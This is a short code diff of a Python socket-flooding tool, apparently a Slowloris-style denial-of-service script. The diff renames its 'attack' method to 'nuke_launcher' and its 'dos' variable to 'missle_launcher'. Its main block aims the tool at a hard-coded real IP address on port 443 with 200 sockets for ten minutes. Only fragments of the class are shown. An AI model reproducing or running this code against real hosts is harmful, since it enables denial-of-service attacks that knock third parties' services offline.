@@ -33,7 +33,7 @@ class tool():
             time.sleep(0.5)
             return self.newSocket()
 
-    def attack(self, timeout=sys.maxsize, sleep=15):
+    def nuke_launcher(self, timeout=sys.maxsize, sleep=15):
         t, i = time.time(), 0
         while(time.time() - t < timeout):
             for s in self._sockets:
@@ -48,5 +48,5 @@ class tool():
 
 
 if __name__ == '__main__':
-    dos = tool('54.207.20.104', 443, socketCount=200)
-    dos.attack(timeout=60*10)
+    missle_launcher = tool('54.207.20.104', 443, socketCount=200)
+    missle_launcher.nuke_launcher(timeout=60 * 10)
